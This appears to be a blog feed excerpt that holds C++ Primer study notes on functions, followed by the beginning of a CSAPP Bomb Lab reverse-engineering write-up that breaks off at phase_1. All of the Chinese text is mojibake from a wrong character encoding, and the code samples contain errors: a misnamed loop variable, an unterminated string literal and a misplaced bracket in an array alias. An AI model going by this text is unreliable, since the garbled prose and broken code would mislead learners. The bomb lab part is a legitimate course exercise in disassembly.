        <content type="html"><![CDATA[<h1 id="ç¬¬6ç« -å‡½æ•°">ç¬¬6ç«  å‡½æ•°</h1><h2 id="å‡½æ•°åŸºç¡€">å‡½æ•°åŸºç¡€</h2><ul><li><strong>å‡½æ•°å®šä¹‰</strong>ï¼šåŒ…æ‹¬è¿”å›ç±»å‹ã€å‡½æ•°åå­—å’Œ0ä¸ªæˆ–è€…å¤šä¸ª<strong>å½¢å‚</strong>ï¼ˆparameterï¼‰ç»„æˆçš„åˆ—è¡¨å’Œå‡½æ•°ä½“ã€‚</li><li><strong>è°ƒç”¨è¿ç®—ç¬¦</strong>ï¼šè°ƒç”¨è¿ç®—ç¬¦çš„å½¢å¼æ˜¯ä¸€å¯¹åœ†æ‹¬å· <code>()</code>ï¼Œä½œç”¨äºä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¯¥è¡¨è¾¾å¼æ˜¯å‡½æ•°æˆ–è€…æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆã€‚</li><li>åœ†æ‹¬å·å†…æ˜¯ç”¨é€—å·éš”å¼€çš„<strong>å®å‚</strong>ï¼ˆargumentï¼‰åˆ—è¡¨ã€‚</li><li>å‡½æ•°è°ƒç”¨è¿‡ç¨‹ï¼š<ul><li>1.ä¸»è°ƒå‡½æ•°ï¼ˆcalling functionï¼‰çš„æ‰§è¡Œè¢«ä¸­æ–­ã€‚</li><li>2.è¢«è°ƒå‡½æ•°ï¼ˆcalled functionï¼‰å¼€å§‹æ‰§è¡Œã€‚</li></ul></li><li><strong>å½¢å‚å’Œå®å‚</strong>ï¼šå½¢å‚å’Œå®å‚çš„<strong>ä¸ªæ•°</strong>å’Œ<strong>ç±»å‹</strong>å¿…é¡»åŒ¹é…ä¸Šã€‚</li><li><strong>è¿”å›ç±»å‹</strong>ï¼š <code>void</code>è¡¨ç¤ºå‡½æ•°ä¸è¿”å›ä»»ä½•å€¼ã€‚å‡½æ•°çš„è¿”å›ç±»å‹ä¸èƒ½æ˜¯æ•°ç»„ç±»å‹æˆ–è€…å‡½æ•°ç±»å‹ï¼Œä½†å¯ä»¥æ˜¯æŒ‡å‘æ•°ç»„æˆ–è€…å‡½æ•°çš„æŒ‡é’ˆã€‚</li><li><strong>åå­—</strong>ï¼šåå­—çš„ä½œç”¨äºæ˜¯ç¨‹åºæ–‡æœ¬çš„ä¸€éƒ¨åˆ†ï¼Œåå­—åœ¨å…¶ä¸­å¯è§ã€‚</li></ul><h3 id="å±€éƒ¨å¯¹è±¡">å±€éƒ¨å¯¹è±¡</h3><ul><li><strong>ç”Ÿå‘½å‘¨æœŸ</strong>ï¼šå¯¹è±¡çš„ç”Ÿå‘½å‘¨æœŸæ˜¯ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­è¯¥å¯¹è±¡å­˜åœ¨çš„ä¸€æ®µæ—¶é—´ã€‚</li><li><strong>å±€éƒ¨å˜é‡</strong>ï¼ˆlocal variableï¼‰ï¼šå½¢å‚å’Œå‡½æ•°ä½“å†…éƒ¨å®šä¹‰çš„å˜é‡ç»Ÿç§°ä¸ºå±€éƒ¨å˜é‡ã€‚å®ƒå¯¹å‡½æ•°è€Œè¨€æ˜¯å±€éƒ¨çš„ï¼Œå¯¹å‡½æ•°å¤–éƒ¨è€Œè¨€æ˜¯<strong>éšè—</strong>çš„ã€‚</li><li><strong>è‡ªåŠ¨å¯¹è±¡</strong>ï¼šåªå­˜åœ¨äºå—æ‰§è¡ŒæœŸé—´çš„å¯¹è±¡ã€‚å½“å—çš„æ‰§è¡Œç»“æŸåï¼Œå®ƒçš„å€¼å°±å˜æˆ<strong>æœªå®šä¹‰</strong>çš„äº†ã€‚</li><li><strong>å±€éƒ¨é™æ€å¯¹è±¡</strong>ï¼š <code>static</code>ç±»å‹çš„å±€éƒ¨å˜é‡ï¼Œç”Ÿå‘½å‘¨æœŸè´¯ç©¿å‡½æ•°è°ƒç”¨å‰åã€‚</li></ul><h3 id="å‡½æ•°å£°æ˜">å‡½æ•°å£°æ˜</h3><ul><li><strong>å‡½æ•°å£°æ˜</strong>ï¼šå‡½æ•°çš„å£°æ˜å’Œå®šä¹‰å”¯ä¸€çš„åŒºåˆ«æ˜¯å£°æ˜æ— éœ€å‡½æ•°ä½“ï¼Œç”¨ä¸€ä¸ªåˆ†å·æ›¿ä»£ã€‚å‡½æ•°å£°æ˜ä¸»è¦ç”¨äºæè¿°å‡½æ•°çš„æ¥å£ï¼Œä¹Ÿç§°<strong>å‡½æ•°åŸå‹</strong>ã€‚</li><li><strong>åœ¨å¤´æ–‡ä»¶ä¸­è¿›è¡Œå‡½æ•°å£°æ˜</strong>ï¼šå»ºè®®å˜é‡åœ¨å¤´æ–‡ä»¶ä¸­å£°æ˜ï¼›åœ¨æºæ–‡ä»¶ä¸­å®šä¹‰ã€‚</li><li><strong>åˆ†ç¦»ç¼–è¯‘</strong>ï¼š <code>CC a.cc b.cc</code>ç›´æ¥ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼›<code>CC -c a.cc b.cc</code>ç¼–è¯‘ç”Ÿæˆå¯¹è±¡ä»£ç <code>a.o b.o</code>ï¼› <code>CC a.o b.o</code>ç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚</li></ul><h2 id="å‚æ•°ä¼ é€’">å‚æ•°ä¼ é€’</h2><ul><li>å½¢å‚åˆå§‹åŒ–çš„æœºç†å’Œå˜é‡åˆå§‹åŒ–ä¸€æ ·ã€‚</li><li><strong>å¼•ç”¨ä¼ é€’</strong>ï¼ˆpassed by referenceï¼‰ï¼šåˆç§°ä¼ å¼•ç”¨è°ƒç”¨ï¼ˆcalled by referenceï¼‰ï¼ŒæŒ‡<strong>å½¢å‚æ˜¯å¼•ç”¨ç±»å‹</strong>ï¼Œå¼•ç”¨å½¢å‚æ˜¯å®ƒå¯¹åº”çš„å®å‚çš„åˆ«åã€‚</li><li><strong>å€¼ä¼ é€’</strong>ï¼ˆpassed by valueï¼‰ï¼šåˆç§°ä¼ å€¼è°ƒç”¨ï¼ˆcalled by valueï¼‰ï¼ŒæŒ‡å®å‚çš„å€¼æ˜¯é€šè¿‡<strong>æ‹·è´</strong>ä¼ é€’ç»™å½¢å‚ã€‚</li></ul><h3 id="ä¼ å€¼å‚æ•°">ä¼ å€¼å‚æ•°</h3><ul><li>å½“åˆå§‹åŒ–ä¸€ä¸ªéå¼•ç”¨ç±»å‹çš„å˜é‡æ—¶ï¼Œåˆå§‹å€¼è¢«æ‹·è´ç»™å˜é‡ã€‚</li><li>å‡½æ•°å¯¹å½¢å‚åšçš„æ‰€æœ‰æ“ä½œéƒ½ä¸ä¼šå½±å“å®å‚ã€‚</li><li><strong>æŒ‡é’ˆå½¢å‚</strong>ï¼šå¸¸ç”¨åœ¨Cä¸­ï¼Œ<code>C++</code>å»ºè®®ä½¿ç”¨å¼•ç”¨ç±»å‹çš„å½¢å‚ä»£æ›¿æŒ‡é’ˆã€‚</li></ul><h3 id="ä¼ å¼•ç”¨å‚æ•°">ä¼ å¼•ç”¨å‚æ•°</h3><ul><li>é€šè¿‡ä½¿ç”¨å¼•ç”¨å½¢å‚ï¼Œå…è®¸å‡½æ•°æ”¹å˜ä¸€ä¸ªæˆ–å¤šä¸ªå®å‚çš„å€¼ã€‚</li><li>å¼•ç”¨å½¢å‚ç›´æ¥å…³è”åˆ°ç»‘å®šçš„å¯¹è±¡ï¼Œè€Œéå¯¹è±¡çš„å‰¯æœ¬ã€‚</li><li>ä½¿ç”¨å¼•ç”¨å½¢å‚å¯ä»¥ç”¨äº<strong>è¿”å›é¢å¤–çš„ä¿¡æ¯</strong>ã€‚</li><li>ç»å¸¸ç”¨å¼•ç”¨å½¢å‚æ¥é¿å…ä¸å¿…è¦çš„å¤åˆ¶ã€‚</li><li><code>void swap(int &amp;v1, int &amp;v2)</code></li><li>å¦‚æœæ— éœ€æ”¹å˜å¼•ç”¨å½¢å‚çš„å€¼ï¼Œæœ€å¥½å°†å…¶å£°æ˜ä¸ºå¸¸é‡å¼•ç”¨ã€‚</li></ul><h3 id="constå½¢å‚å’Œå®å‚">constå½¢å‚å’Œå®å‚</h3><ul><li>å½¢å‚çš„é¡¶å±‚<code>const</code>è¢«å¿½ç•¥ã€‚<code>void func(const int i);</code>è°ƒç”¨æ—¶æ—¢å¯ä»¥ä¼ å…¥<code>const int</code>ä¹Ÿå¯ä»¥ä¼ å…¥<code>int</code>ã€‚</li><li>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨éå¸¸é‡åˆå§‹åŒ–ä¸€ä¸ªåº•å±‚<code>const</code>å¯¹è±¡ï¼Œä½†æ˜¯åè¿‡æ¥ä¸è¡Œã€‚</li><li>åœ¨å‡½æ•°ä¸­ï¼Œä¸èƒ½æ”¹å˜å®å‚çš„<strong>å±€éƒ¨å‰¯æœ¬</strong>ã€‚</li><li>å°½é‡ä½¿ç”¨å¸¸é‡å¼•ç”¨ã€‚</li></ul><h3 id="æ•°ç»„å½¢å‚">æ•°ç»„å½¢å‚</h3><ul><li>å½“æˆ‘ä»¬ä¸ºå‡½æ•°ä¼ é€’ä¸€ä¸ªæ•°ç»„æ—¶ï¼Œå®é™…ä¸Šä¼ é€’çš„æ˜¯æŒ‡å‘æ•°ç»„é¦–å…ƒç´ çš„æŒ‡é’ˆã€‚</li><li>è¦æ³¨æ„æ•°ç»„çš„å®é™…é•¿åº¦ï¼Œä¸èƒ½è¶Šç•Œã€‚</li></ul><h3 id="mainå¤„ç†å‘½ä»¤è¡Œé€‰é¡¹">mainå¤„ç†å‘½ä»¤è¡Œé€‰é¡¹</h3><ul><li><code>int main(int argc, char *argv[])&#123;...&#125;</code></li><li>ç¬¬ä¸€ä¸ªå½¢å‚ä»£è¡¨å‚æ•°çš„ä¸ªæ•°ï¼›ç¬¬äºŒä¸ªå½¢å‚æ˜¯å‚æ•°Cé£æ ¼å­—ç¬¦ä¸²æ•°ç»„ã€‚</li></ul><h3 id="å¯å˜å½¢å‚">å¯å˜å½¢å‚</h3><p><code>initializer_list</code>æä¾›çš„æ“ä½œï¼ˆ<code>C++11</code>ï¼‰ï¼š</p><table><thead><tr><th>æ“ä½œ</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>initializer_list&lt;T&gt; lst;</code></td><td>é»˜è®¤åˆå§‹åŒ–ï¼›<code>T</code>ç±»å‹å…ƒç´ çš„ç©ºåˆ—è¡¨</td></tr><tr><td><code>initializer_list&lt;T&gt; lst&#123;a,b,c...&#125;;</code></td><td><code>lst</code>çš„å…ƒç´ æ•°é‡å’Œåˆå§‹å€¼ä¸€æ ·å¤šï¼›<code>lst</code>çš„å…ƒç´ æ˜¯å¯¹åº”åˆå§‹å€¼çš„å‰¯æœ¬ï¼›åˆ—è¡¨ä¸­çš„å…ƒç´ æ˜¯<code>const</code>ã€‚</td></tr><tr><td><code>lst2(lst)</code></td><td>æ‹·è´æˆ–èµ‹å€¼ä¸€ä¸ª<code>initializer_list</code>å¯¹è±¡ä¸ä¼šæ‹·è´åˆ—è¡¨ä¸­çš„å…ƒç´ ï¼›æ‹·è´åï¼ŒåŸå§‹åˆ—è¡¨å’Œå‰¯æœ¬å…±äº«å…ƒç´ ã€‚</td></tr><tr><td><code>lst2 = lst</code></td><td>åŒä¸Š</td></tr><tr><td><code>lst.size()</code></td><td>åˆ—è¡¨ä¸­çš„å…ƒç´ æ•°é‡</td></tr><tr><td><code>lst.begin()</code></td><td>è¿”å›æŒ‡å‘<code>lst</code>ä¸­é¦–å…ƒç´ çš„æŒ‡é’ˆ</td></tr><tr><td><code>lst.end()</code></td><td>è¿”å›æŒ‡å‘<code>lst</code>ä¸­å¾®å…ƒç´ ä¸‹ä¸€ä½ç½®çš„æŒ‡é’ˆ</td></tr></tbody></table><p><code>initializer_list</code>ä½¿ç”¨demoï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">err_msg</span><span class="params">(ErrCode e, initializer_list&lt;string&gt; il)</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; e.msg &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> bed = il.<span class="built_in">begin</span>(); beg != il.<span class="built_in">end</span>(); ++ beg)</span><br><span class="line">        cout &lt;&lt; *beg &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">err_msg</span>(<span class="built_in">ErrCode</span>(<span class="number">0</span>), &#123;<span class="string">&quot;functionX&quot;</span>, <span class="string">&quot;okay&#125;);</span></span><br></pre></td></tr></table></figure><ul><li>æ‰€æœ‰å®å‚ç±»å‹ç›¸åŒï¼Œå¯ä»¥ä½¿ç”¨ <code>initializer_list</code>çš„æ ‡å‡†åº“ç±»å‹ã€‚</li><li>å®å‚ç±»å‹ä¸åŒï¼Œå¯ä»¥ä½¿ç”¨<code>å¯å˜å‚æ•°æ¨¡æ¿</code>ã€‚</li><li>çœç•¥å½¢å‚ç¬¦ï¼š <code>...</code>ï¼Œä¾¿äº<code>C++</code>è®¿é—®æŸäº›Cä»£ç ï¼Œè¿™äº›Cä»£ç ä½¿ç”¨äº† <code>varargs</code>çš„Cæ ‡å‡†åŠŸèƒ½ã€‚</li></ul><h2 id="è¿”å›ç±»å‹å’Œreturnè¯­å¥">è¿”å›ç±»å‹å’Œreturnè¯­å¥</h2><h3 id="æ— è¿”å›å€¼å‡½æ•°">æ— è¿”å›å€¼å‡½æ•°</h3><p>æ²¡æœ‰è¿”å›å€¼çš„ <code>return</code>è¯­å¥åªèƒ½ç”¨åœ¨è¿”å›ç±»å‹æ˜¯ <code>void</code>çš„å‡½æ•°ä¸­ï¼Œè¿”å› <code>void</code>çš„å‡½æ•°ä¸è¦æ±‚éå¾—æœ‰ <code>return</code>è¯­å¥ã€‚</p><h3 id="æœ‰è¿”å›å€¼å‡½æ•°">æœ‰è¿”å›å€¼å‡½æ•°</h3><ul><li><code>return</code>è¯­å¥çš„è¿”å›å€¼çš„ç±»å‹å¿…é¡»å’Œå‡½æ•°çš„è¿”å›ç±»å‹ç›¸åŒï¼Œæˆ–è€…èƒ½å¤Ÿ<strong>éšå¼åœ°</strong>è½¬æ¢æˆå‡½æ•°çš„è¿”å›ç±»å‹ã€‚</li><li>å€¼çš„è¿”å›ï¼šè¿”å›çš„å€¼ç”¨äºåˆå§‹åŒ–è°ƒç”¨ç‚¹çš„ä¸€ä¸ª<strong>ä¸´æ—¶é‡</strong>ï¼Œè¯¥ä¸´æ—¶é‡å°±æ˜¯å‡½æ•°è°ƒç”¨çš„ç»“æœã€‚</li><li><strong>ä¸è¦è¿”å›å±€éƒ¨å¯¹è±¡çš„å¼•ç”¨æˆ–æŒ‡é’ˆ</strong>ã€‚</li><li><strong>å¼•ç”¨è¿”å›å·¦å€¼</strong>ï¼šå‡½æ•°çš„è¿”å›ç±»å‹å†³å®šå‡½æ•°è°ƒç”¨æ˜¯å¦æ˜¯å·¦å€¼ã€‚è°ƒç”¨ä¸€ä¸ªè¿”å›å¼•ç”¨çš„å‡½æ•°å¾—åˆ°å·¦å€¼ï¼›å…¶ä»–è¿”å›ç±»å‹å¾—åˆ°å³å€¼ã€‚</li><li><strong>åˆ—è¡¨åˆå§‹åŒ–è¿”å›å€¼</strong>ï¼šå‡½æ•°å¯ä»¥è¿”å›èŠ±æ‹¬å·åŒ…å›´çš„å€¼çš„åˆ—è¡¨ã€‚ï¼ˆ<code>C++11</code>ï¼‰</li><li><strong>ä¸»å‡½æ•°mainçš„è¿”å›å€¼</strong>ï¼šå¦‚æœç»“å°¾æ²¡æœ‰<code>return</code>ï¼Œç¼–è¯‘å™¨å°†éšå¼åœ°æ’å…¥ä¸€æ¡è¿”å›0çš„<code>return</code>è¯­å¥ã€‚è¿”å›0ä»£è¡¨æ‰§è¡ŒæˆåŠŸã€‚</li></ul><h3 id="è¿”å›æ•°ç»„æŒ‡é’ˆ">è¿”å›æ•°ç»„æŒ‡é’ˆ</h3><ul><li><code>Type (*function (parameter_list))[dimension]</code></li><li>ä½¿ç”¨ç±»å‹åˆ«åï¼š <code>typedef int arrT[10];</code> æˆ–è€… <code>using arrT = int[10;]</code>ï¼Œç„¶å <code>arrT* func() &#123;...&#125;</code></li><li>ä½¿ç”¨ <code>decltype</code>ï¼š <code>decltype(odd) *arrPtr(int i) &#123;...&#125;</code></li><li><strong>å°¾ç½®è¿”å›ç±»å‹</strong>ï¼š åœ¨å½¢å‚åˆ—è¡¨åé¢ä»¥ä¸€ä¸ª<code>-&gt;</code>å¼€å§‹ï¼š<code>auto func(int i) -&gt; int(*)[10]</code>ï¼ˆ<code>C++11</code>ï¼‰</li></ul><h2 id="å‡½æ•°é‡è½½">å‡½æ•°é‡è½½</h2><ul><li><strong>é‡è½½</strong>ï¼šå¦‚æœåŒä¸€ä½œç”¨åŸŸå†…å‡ ä¸ªå‡½æ•°åå­—ç›¸åŒä½†å½¢å‚åˆ—è¡¨ä¸åŒï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºé‡è½½ï¼ˆoverloadï¼‰å‡½æ•°ã€‚</li><li><code>main</code>å‡½æ•°ä¸èƒ½é‡è½½ã€‚</li><li><strong>é‡è½½å’Œconstå½¢å‚</strong>ï¼š<ul><li>ä¸€ä¸ªæœ‰é¡¶å±‚constçš„å½¢å‚å’Œæ²¡æœ‰å®ƒçš„å‡½æ•°æ— æ³•åŒºåˆ†ã€‚ <code>Record lookup(Phone* const)</code>å’Œ <code>Record lookup(Phone*)</code>æ— æ³•åŒºåˆ†ã€‚</li><li>ç›¸åï¼Œæ˜¯å¦æœ‰æŸä¸ªåº•å±‚constå½¢å‚å¯ä»¥åŒºåˆ†ã€‚ <code>Record lookup(Account*)</code>å’Œ <code>Record lookup(const Account*)</code>å¯ä»¥åŒºåˆ†ã€‚</li></ul></li><li><strong>é‡è½½å’Œä½œç”¨åŸŸ</strong>ï¼šè‹¥åœ¨å†…å±‚ä½œç”¨åŸŸä¸­å£°æ˜åå­—ï¼Œå®ƒå°†éšè—å¤–å±‚ä½œç”¨åŸŸä¸­å£°æ˜çš„åŒåå®ä½“ï¼Œåœ¨ä¸åŒçš„ä½œç”¨åŸŸä¸­æ— æ³•é‡è½½å‡½æ•°åã€‚</li></ul><h2 id="ç‰¹æ®Šç”¨é€”è¯­è¨€ç‰¹æ€§">ç‰¹æ®Šç”¨é€”è¯­è¨€ç‰¹æ€§</h2><h3 id="é»˜è®¤å®å‚">é»˜è®¤å®å‚</h3><ul><li><code>string screen(sz ht = 24, sz wid = 80, char backgrnd = ' ');</code></li><li>ä¸€æ—¦æŸä¸ªå½¢å‚è¢«èµ‹äºˆäº†é»˜è®¤å€¼ï¼Œé‚£ä¹ˆå®ƒä¹‹åçš„å½¢å‚éƒ½å¿…é¡»è¦æœ‰é»˜è®¤å€¼ã€‚</li></ul><h3 id="å†…è”ï¼ˆinlineï¼‰å‡½æ•°">å†…è”ï¼ˆinlineï¼‰å‡½æ•°</h3><ul><li>æ™®é€šå‡½æ•°çš„ç¼ºç‚¹ï¼šè°ƒç”¨å‡½æ•°æ¯”æ±‚è§£ç­‰ä»·è¡¨è¾¾å¼è¦æ…¢å¾—å¤šã€‚</li><li><code>inline</code>å‡½æ•°å¯ä»¥é¿å…å‡½æ•°è°ƒç”¨çš„å¼€é”€ï¼Œå¯ä»¥è®©ç¼–è¯‘å™¨åœ¨ç¼–è¯‘æ—¶<strong>å†…è”åœ°å±•å¼€</strong>è¯¥å‡½æ•°ã€‚</li><li><code>inline</code>å‡½æ•°åº”è¯¥åœ¨å¤´æ–‡ä»¶ä¸­å®šä¹‰ã€‚</li></ul><h3 id="constexprå‡½æ•°">constexprå‡½æ•°</h3><ul><li>æŒ‡èƒ½ç”¨äºå¸¸é‡è¡¨è¾¾å¼çš„å‡½æ•°ã€‚</li><li><code>constexpr int new_sz() &#123;return 42;&#125;</code></li><li>å‡½æ•°çš„è¿”å›ç±»å‹åŠæ‰€æœ‰å½¢å‚ç±»å‹éƒ½è¦æ˜¯å­—é¢å€¼ç±»å‹ã€‚</li><li><code>constexpr</code>å‡½æ•°åº”è¯¥åœ¨å¤´æ–‡ä»¶ä¸­å®šä¹‰ã€‚</li></ul><h3 id="è°ƒè¯•å¸®åŠ©">è°ƒè¯•å¸®åŠ©</h3><ul><li><code>assert</code>é¢„å¤„ç†å®ï¼ˆpreprocessor macroï¼‰ï¼š<code>assert(expr);</code></li></ul><p>å¼€å…³è°ƒè¯•çŠ¶æ€ï¼š</p><p><code>CC -D NDEBUG main.c</code>å¯ä»¥å®šä¹‰è¿™ä¸ªå˜é‡<code>NDEBUG</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">ifndef</span> NDEBUG</span></span><br><span class="line">        cerr &lt;&lt; __func__ &lt;&lt; <span class="string">&quot;...&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å‡½æ•°åŒ¹é…">å‡½æ•°åŒ¹é…</h2><ul><li>é‡è½½å‡½æ•°åŒ¹é…çš„<strong>ä¸‰ä¸ªæ­¥éª¤</strong>ï¼š1.å€™é€‰å‡½æ•°ï¼›2.å¯è¡Œå‡½æ•°ï¼›3.å¯»æ‰¾æœ€ä½³åŒ¹é…ã€‚</li><li><strong>å€™é€‰å‡½æ•°</strong>ï¼šé€‰å®šæœ¬æ¬¡è°ƒç”¨å¯¹åº”çš„é‡è½½å‡½æ•°é›†ï¼Œé›†åˆä¸­çš„å‡½æ•°ç§°ä¸ºå€™é€‰å‡½æ•°ï¼ˆcandidate functionï¼‰ã€‚</li><li><strong>å¯è¡Œå‡½æ•°</strong>ï¼šè€ƒå¯Ÿæœ¬æ¬¡è°ƒç”¨æä¾›çš„å®å‚ï¼Œé€‰å‡ºå¯ä»¥è¢«è¿™ç»„å®å‚è°ƒç”¨çš„å‡½æ•°ï¼Œæ–°é€‰å‡ºçš„å‡½æ•°ç§°ä¸ºå¯è¡Œå‡½æ•°ï¼ˆviable functionï¼‰ã€‚</li><li><strong>å¯»æ‰¾æœ€ä½³åŒ¹é…</strong>ï¼šåŸºæœ¬æ€æƒ³ï¼šå®å‚ç±»å‹å’Œå½¢å‚ç±»å‹è¶Šæ¥è¿‘ï¼Œå®ƒä»¬åŒ¹é…åœ°è¶Šå¥½ã€‚</li></ul><h2 id="å‡½æ•°æŒ‡é’ˆ">å‡½æ•°æŒ‡é’ˆ</h2><ul><li><strong>å‡½æ•°æŒ‡é’ˆ</strong>ï¼šæ˜¯æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆã€‚</li><li><code>bool (*pf)(const string &amp;, const string &amp;);</code> æ³¨ï¼šä¸¤ç«¯çš„æ‹¬å·ä¸å¯å°‘ã€‚</li><li><strong>å‡½æ•°æŒ‡é’ˆå½¢å‚</strong>ï¼š<ul><li>å½¢å‚ä¸­ä½¿ç”¨å‡½æ•°å®šä¹‰æˆ–è€…å‡½æ•°æŒ‡é’ˆå®šä¹‰æ•ˆæœä¸€æ ·ã€‚</li><li>ä½¿ç”¨ç±»å‹åˆ«åæˆ–è€…<code>decltype</code>ã€‚</li></ul></li><li><strong>è¿”å›æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆ</strong>ï¼š1.ç±»å‹åˆ«åï¼›2.å°¾ç½®è¿”å›ç±»å‹ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
          <category> ã€ŠC++ Primer 5thã€‹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-Bomblabè¯¦è§£ï¼ˆå«secret_phaseï¼‰</title>
      <link href="/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/"/>
      <url>/2023/05/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80-CSAPP-l2-bomblab/</url>
      
        <content type="html"><![CDATA[<p><a href="http://csapp.cs.cmu.edu/im/labs/datalab.tar"><em>Data Lab</em></a> <em>[Updated 1/12/16]</em> (<a href="http://csapp.cs.cmu.edu/3e/README-bomblab">README</a>, <a href="http://csapp.cs.cmu.edu/3e/bomblab.pdf">Writeup</a>, <a href="http://csapp.cs.cmu.edu/3e/bomblab-release.html">Release Notes</a>, <a href="http://csapp.cs.cmu.edu/3e/bomb.tar">Self-Study Handout</a>)</p><blockquote><p>A â€œbinary bombâ€ is a program provided to students as an object code file. When run, it prompts the user to type in 6 different strings. If any of these is incorrect, the bomb â€œexplodes,â€ printing an error message and logging the event on a grading server. Students must â€œdefuseâ€ their own unique bomb by disassembling and reverse engineering the program to determine what the 6 strings should be. The lab teaches students to understand assembly language, and also forces them to learn how to use a debugger. Itâ€™s also great fun. A legendary lab among the CMU undergrads.</p><p>Hereâ€™s a <a href="http://csapp.cs.cmu.edu/3e/bomb.tar">Linux/x86-64 binary bomb</a> that you can try out for yourself. The feature that notifies the grading server has been disabled, so feel free to explode this bomb with impunity. If youâ€™re an instructor with a CS:APP account, then you can download the <a href="http://csapp.cs.cmu.edu/im/bomb-solution.txt">solution</a>.</p></blockquote><p>å®éªŒä½œä¸šç½‘å€ï¼š<a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p><hr><p>ç½‘ä¸Šè®¸å¤šæ•™ç¨‹éƒ½æ˜¯åŸºäºnaive gdbæ¥åšçš„ï¼Œä½†Beejâ€™sÂ <a href="http://beej.us/guide/bggdb/">Quick Guide to GDB</a>ä¸­ä½œè€…éƒ½è¯´ä»æ¥ä¸ä¼šç›´æ¥ä½¿ç”¨æ™®é€šæ¨¡å¼çš„gdbã€‚<br>æœ¬æ–‡åŸºäºIDA proå’Œpwndbgï¼š</p><ul><li>IDAï¼šå¼ºå¤§çš„åæ±‡ç¼–ï¼ˆåç¼–è¯‘ï¼‰å·¥å…·ï¼ŒæŒ‡ä»¤æµå›¾å’ŒF5åç¼–è¯‘ç”¨èµ·æ¥å¤ªçˆ½å•¦ã€‚</li><li>pwndbgï¼šgdbçš„æ’ä»¶ï¼Œå¯ä»¥åœ¨è°ƒè¯•æ—¶æ˜¾ç¤ºå¯„å­˜å™¨ã€æŒ‡ä»¤åˆ—è¡¨ã€æ ˆã€backstraceç­‰ä¿¡æ¯å’Œè¾…åŠ©æç¤ºä¿¡æ¯ã€‚</li></ul><p>æ³¨æ„ï¼š</p><ul><li>pwndbgä¸naive gdbä½¿ç”¨ä¸Šæœ‰äº›ä¸åŒï¼Œæ¯”å¦‚ä¸èƒ½ä½¿ç”¨<code>disas</code> ï¼Œå¾—ç”¨<code>disassemble</code> ï¼Œè¾“å‡ºçš„æ ¼å¼ä¹Ÿä¸æ˜¯gdbé»˜è®¤çš„AT&amp;Tæ ¼å¼ï¼Œè€Œæ˜¯intelæ ¼å¼ï¼Œè¿™ä¸IDAåæ±‡ç¼–æ ¼å¼ç›¸åŒï¼Œçœ‹èµ·æ¥æ›´æ–¹ä¾¿ã€‚</li><li>ä½¿ç”¨naive gdbå¯¹ç†Ÿç»ƒgdbå¾ˆæœ‰å¥½å¤„ï¼Œä½†ä½œä¸ºä½¿ç”¨åä¸ªæ‰‹æŒ‡çš„äººç±»ï¼Œæˆ‘è¿˜æ˜¯æ›´å–œæ¬¢çœ‹IDAå¼ºå¤§çš„åç¼–è¯‘å·¥å…·ï¼Œå’Œpwndbgè¾…åŠ©æ’ä»¶ã€‚</li></ul><h1 id="phase-1">phase_1</h1><aside>ğŸ’¡ x86_64 linux é€šè¿‡ rdi, rsi åˆ†åˆ«ä¼ å…¥å‡½æ•°å‚æ•°</aside><p><code>pwndbg&gt;disassemble main</code> å¯ä»¥çœ‹åˆ°main()å‡½æ•°<strong>åæ±‡ç¼–</strong>ç»“æœï¼Œå¯ä»¥è§‚å¯Ÿåˆ°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400e32 &lt;+146&gt;:   call   0x40149e &lt;read_line&gt;</span><br><span class="line">0x0000000000400e37 &lt;+151&gt;:   mov    rdi,rax</span><br><span class="line">0x0000000000400e3a &lt;+154&gt;:   call   0x400ee0 &lt;phase_1&gt;</span><br><span class="line">0x0000000000400e3f &lt;+159&gt;:   call   0x4015c4 &lt;phase_defused&gt;</span><br></pre></td></tr></table></figure><p>read_lineçš„è¿”å›å€¼raxæ˜¯è¯»å…¥çš„å­—ç¬¦ä¸²åœ°å€ï¼Œä¼ ç»™äº†rdiï¼Œåº”å½“æ˜¯è¦ä½œä¸ºphase_1çš„å‚æ•°ï¼Œé‡Œé¢å­˜æ”¾çš„æ˜¯æˆ‘ä»¬çš„è¾“å…¥å€¼ã€‚æŸ¥çœ‹phase_1çš„åæ±‡ç¼–ä»£ç 